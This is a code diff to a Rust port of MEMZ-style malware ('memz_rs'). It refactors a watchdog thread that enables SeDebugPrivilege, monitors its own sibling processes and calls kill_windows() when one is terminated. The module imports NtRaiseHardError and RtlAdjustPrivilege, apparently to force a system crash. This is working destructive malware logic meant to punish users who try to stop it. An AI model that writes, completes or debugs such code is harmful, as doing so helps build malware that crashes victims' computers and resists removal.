@@ -4,42 +4,33 @@ use memz_rs::{
     convert_str::ToPCSTRWrapper,
     data::data::MSGS,
     ntdll::{
-        data::Privilege,
         library::Library,
         ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
     },
     payloads::payloads::msg_box_hook,
-    winapi_type::DWORD,
     wrap_windows_api::{
-        lstrcmp_w, wrap_close_handle, wrap_create_toolhelp32_snapshot, wrap_get_current_thread_id,
-        wrap_get_proc_address, wrap_get_process_image_filename_a, wrap_load_library_a,
-        wrap_messagebox_a, wrap_process32_next, wrap_set_windows_hook_ex_a,
-        wrap_unhook_windows_hook_ex, Resolution,
+        wrap_close_handle, wrap_create_toolhelp32_snapshot, wrap_get_current_thread_id,
+        wrap_get_process_image_filename_a, wrap_messagebox_a, wrap_process32_next,
+        wrap_set_privilege, wrap_set_windows_hook_ex_a, wrap_unhook_windows_hook_ex, Resolution,
     },
     LMEM_ZEROINIT,
 };
 use rand::Rng;
 use std::{
-    env::args,
     mem::size_of,
-    ptr,
     thread::{self, sleep},
     time::Duration,
 };
-use windows::{
-    core::PCSTR,
-    Win32::{
-        Foundation::{BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE, NTSTATUS},
-        Graphics::Gdi::HFONT,
-        System::{
-            Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
-            Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
-        },
-        UI::WindowsAndMessaging::{HOOKPROC, MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT},
+use windows::Win32::{
+    Foundation::{BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE, NTSTATUS},
+    Graphics::Gdi::HFONT,
+    System::{
+        Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
+        Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_QUERY_LIMITED_INFORMATION},
     },
+    UI::WindowsAndMessaging::{MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT},
 };
 
-// #[cfg(feature = "CLEAN")]
 struct Clean {
     main_window: HWND,
     font: HFONT,
@@ -103,64 +94,127 @@ fn kill_windows_instant() -> Result<(), ()> {
 
 fn main() {
     let res = Resolution::new();
-    // #[cfg(feature="CLEAN")]
-    let watchdog_thread = thread::spawn(move || -> Result<(), ()> {
-        let mut oproc = 0;
-        let mut f_buf1: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
-        wrap_get_process_image_filename_a(&mut f_buf1)?;
-
-        sleep(Duration::from_millis(1000));
-
-        loop {
-            let snapshot = wrap_create_toolhelp32_snapshot()?;
-            let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
-                dwSize: size_of::<PROCESSENTRY32> as u32,
-                ..Default::default()
-            };
-            dbg!(proc);
-            unsafe {
-                dbg!(Process32First(snapshot, &mut proc as *mut PROCESSENTRY32)); // <-- Error Line
-                
-            }
-
-            let mut nproc = 0;
-            loop {
-                let h_proc: Option<HANDLE>;
-                unsafe {
-                    h_proc =
-                        match OpenProcess(PROCESS_QUERY_INFORMATION, BOOL(0), proc.th32ProcessID) {
-                            Ok(handle) => Some(handle),
-                            Err(e) => {
-                                eprintln!("Error: {e}");
-                                None
-                            }
-                        };
-                        dbg!(h_proc);
-                }
-                let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
-                wrap_get_process_image_filename_a(&mut f_buf2)?;
-
-                if f_buf1 != f_buf2 {
-                    nproc += 1;
-                }
-
-                wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
-                drop(f_buf2);
-
-                if wrap_process32_next(snapshot, &mut proc)? {
-                    break;
-                }
-            }
-            wrap_close_handle(snapshot)?;
-
-            if nproc < oproc {
-                kill_windows()?;
-            }
-
-            oproc = nproc;
-
-            sleep(Duration::from_millis(10));
-        }
-    });
+    let watchdog_thread = thread::spawn(watchdog_thread);
     watchdog_thread.join().unwrap().unwrap();
+}
+
+fn watchdog_thread() -> Result<(), ()> {
+    let mut oproc = 0;
+    let mut f_buf1: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
+    wrap_get_process_image_filename_a(&mut f_buf1)?;
+    #[cfg(feature = "DEBUG")]
+    {
+        println!("f_buf1: {}", String::from_utf8_lossy(&f_buf1.as_slice()));
+        sleep(Duration::from_millis(1000));
+    }
+    sleep(Duration::from_millis(1000));
+    
+    dbg!(wrap_set_privilege("SeDebugPrivilege", true)?);
+
+    loop {
+        let snapshot = wrap_create_toolhelp32_snapshot()?;
+        #[cfg(feature = "DEBUG")]
+        {
+            dbg!(&snapshot);
+            sleep(Duration::from_millis(1000));
+        }
+        let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
+            dwSize: size_of::<PROCESSENTRY32>() as u32,
+            ..Default::default()
+        };
+        #[cfg(feature = "DEBUG")]
+        {
+            // dbg!(&proc);
+            sleep(Duration::from_millis(1000));
+        }
+        unsafe {
+            Process32First(snapshot, &mut proc);
+            #[cfg(feature = "DEBUG")]
+            {
+                println!(
+                    "Process32First() proc.th32ProcessID: {}",
+                    proc.th32ProcessID
+                );
+                println!(
+                    "Process32First() proc.szExeFile: {}",
+                    String::from_utf8_lossy(&proc.szExeFile)
+                );
+                sleep(Duration::from_millis(1000));
+            }
+        }
+
+        let mut nproc = 0;
+        loop {
+            let mut h_proc: Option<HANDLE> = None;
+            if proc.th32ProcessID != 0 {
+                unsafe {
+                    h_proc = match OpenProcess(
+                        PROCESS_QUERY_INFORMATION, // Permission Denined: PROCESS_QUERY_INFORMATION
+                        BOOL(0),
+                        proc.th32ProcessID,
+                    ) {
+                        Ok(handle) => Some(handle),
+                        Err(e) => {
+                            dbg!(&e);
+                            None
+                        }
+                    };
+                }
+            }
+            #[cfg(feature = "DEBUG")]
+            {
+                dbg!(&h_proc);
+                sleep(Duration::from_millis(1000));
+            }
+            let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
+            wrap_get_process_image_filename_a(&mut f_buf2)?;
+            #[cfg(feature = "DEBUG")]
+            {
+                println!("f_buf2: {}", String::from_utf8_lossy(&f_buf2.as_slice()));
+                sleep(Duration::from_millis(1000));
+            }
+            if f_buf1 != f_buf2 {
+                nproc += 1;
+                #[cfg(feature = "DEBUG")]
+                {
+                    dbg!(&nproc);
+                    sleep(Duration::from_millis(1000));
+                }
+            }
+
+            wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
+            drop(f_buf2);
+
+            #[cfg(not(feature = "DEBUG"))]
+            if !wrap_process32_next(snapshot, &mut proc) {
+                break;
+            }
+            #[cfg(feature = "DEBUG")]
+            if dbg!(!wrap_process32_next(snapshot, &mut proc)) {
+                break;
+            }
+
+            if proc.th32ProcessID == 0 {
+                panic!("Unable to open system process");
+            }
+
+            #[cfg(feature = "DEBUG")]
+            {
+                println!("Process32Next() proc.th32ProcessID {}", proc.th32ProcessID);
+                println!(
+                    "Process32Next() proc.szExeFile: {}",
+                    String::from_utf8_lossy(&proc.szExeFile)
+                );
+                sleep(Duration::from_millis(1000));
+            }
+        }
+        wrap_close_handle(snapshot)?;
+
+        if nproc < oproc {
+            kill_windows()?;
+        }
+        oproc = nproc;
+
+        sleep(Duration::from_millis(10));
+    }
 }
